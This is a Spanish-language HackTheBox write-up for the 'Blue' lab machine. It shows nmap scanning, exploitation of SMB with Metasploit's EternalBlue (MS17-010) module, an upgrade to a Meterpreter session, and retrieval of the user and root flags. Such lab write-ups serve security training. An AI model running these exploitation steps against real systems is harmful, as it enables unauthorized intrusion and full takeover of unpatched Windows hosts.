+++ 
draft = false
date = 2025-11-15T02:27:08Z
title = "Blue Machine - HackTheBox"
description = ""
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++

-----------------------------
- Tags: #Windows #Eternalblue #metasploit 
----------------
# Enumeración Nmap
**Comando:**
```bash
nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.10.40 -oG allPorts
```
En el escaneo nos dice el SO:`Windows 7 professional 7601
![[Pasted image 20251104120942.png]]
<img src="/images/gato.jpg" width="500" height="500">

Si buscamos por vulnerabilidades para la versión de SO, nos aparece MS17-010, y post relacionados con eternalblue 
# Explotamos SMB
 
Por tanto utilizaremos metasploit para buscar algún modulo de eternalblue

![Escaneo de puertos](/images/gato.jgp)
 
Hacemos un
```bash
msfconsole
search eternal
```
y nos aparecen las siguientes opciones, usaremos la opción 2
![[Pasted image 20251104121151.png]]
```bash
use 2
show options
```
 
En las opciones debemos poner el `RHOSTS` y `LPORT`
![[Pasted image 20251104121257.png]]
 
Y luego le damos a `run` y conseguimos una session de meterpreter
![[Pasted image 20251104121632.png]]
 
# Tratamos la consola
 
Usamos los siguientes comandos
```bash
background
search shell_to_meterpreter
use 0
```
![[Pasted image 20251104121917.png]]
 
Usamos la session 1 y le damos a run
```bash
set SESSION 1
run
```
 
Utilizamos `sessions -l` para ver las sessiones y utilizamos `session -i 2` para escogerla
![[Pasted image 20251104122609.png]]
 
Usamos una shell y vemos que tenemos priv de admin
![[Pasted image 20251104122633.png]]
 
# Flag de user
 
Para obtener la flag de `user.txt` la buscamos con el siguiente comando
```bash
cd \
dir "user.txt" /s /b
type C:\Users\haris\Desktop\user.txt
```
 
# Flag de root
 
Para obtener la flag de altos privilegios `root.txt` utilizamos
```bash
cd \
dir "root.txt" /s /b
type C:\Users\Administrator\Desktop\root.txt
```
![[Pasted image 20251104122934.png]]
